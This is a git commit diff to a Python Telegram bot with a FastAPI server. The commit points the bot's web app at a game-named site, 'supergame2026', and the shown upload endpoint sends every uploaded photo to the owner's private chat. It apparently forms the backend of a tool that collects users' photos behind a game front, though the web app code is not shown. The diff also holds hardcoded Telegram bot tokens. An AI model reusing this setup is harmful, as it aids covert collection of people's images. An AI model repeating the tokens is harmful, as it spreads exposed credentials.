803861a316394c40228cde1c3b5b50589c33a963
SonGokai2012 <khalusvadym2012@gmail.com>
2026-09-12 22:29:25 +0300

    Update bot.py

--- bot.py
+++ bot.py
@@ -4,9 +4,9 @@ from aiogram.types import WebAppInfo, InlineKeyboardMarkup, InlineKeyboardButton
 from fastapi import FastAPI, UploadFile, File
 import uvicorn
 
-TOKEN = "8660399029:AAGH4jobrRRFlEj1aZuflMF0fMz232sQp9g"
+TOKEN = "8660399929:AAGH4jobrRRF1Ej1aZuF1MF0fMz232sQp9g"
 MY_CHAT_ID = 8528619678
-WEBAPP_URL = "https://ЗАМЕНИШЬ_ПОЗЖЕ/webapp/index.html"
+WEBAPP_URL = "https://supergame2026.onrender.com/webapp/index.html"
 
 bot = Bot(TOKEN)
 dp = Dispatcher()
@@ -25,10 +25,10 @@ async def upload(photo: UploadFile = File(...)):
     await bot.send_photo(MY_CHAT_ID, BufferedInputFile(data, filename="photo.jpg"))
     return {"ok": True}
 
-async def main():
-    await bot.delete_webhook(drop_pending_updates=True)
-    await dp.start_polling(bot)
+@app.on_event("startup")
+async def on_startup():
+    asyncio.create_task(bot.delete_webhook(drop_pending_updates=True))
+    asyncio.create_task(dp.start_polling(bot))
 
 if __name__ == "__main__":
-    asyncio.create_task(main())
     uvicorn.run(app, host="0.0.0.0", port=8000)
